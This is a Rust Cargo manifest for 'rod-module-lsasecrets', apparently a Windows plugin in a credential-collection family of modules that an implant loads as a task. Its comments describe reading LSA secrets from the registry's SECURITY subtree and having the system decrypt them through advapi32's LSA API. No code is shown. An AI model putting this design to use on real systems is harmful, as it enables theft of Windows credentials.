[package]
name = "rod-module-lsasecrets"
version = "1.0.0"
edition = "2021"

# The credential collection family's fourth module (architecture.md
# Sec 5.4): collect.lsasecrets, the LSA policy's secret store -- the
# inventory enumerated out of the registry's SECURITY subtree, the
# values asked back through the LSA's own policy API (the system
# performs its own decryption; the module touches no crypto), with the
# survey read (the SYSTEM seat held or not, the store's names) as the
# bare task's default. The Windows half speaks advapi32's registry and
# LSA edges directly: a module owes the loader no dependency for eight
# functions. Built as a cdylib for Windows targets and delivered as a
# module.load task's content.

[lib]
# rlib beside cdylib so the bin target below links the same plugin code;
# cargo emits the rlib for internal use only, the cdylib is the artifact.
crate-type = ["cdylib", "rlib"]

[[bin]]
name = "rod-module-lsasecrets"
path = "src/main.rs"

[dependencies]
rod-plugin-sdk = { path = "../../plugin-sdk" }
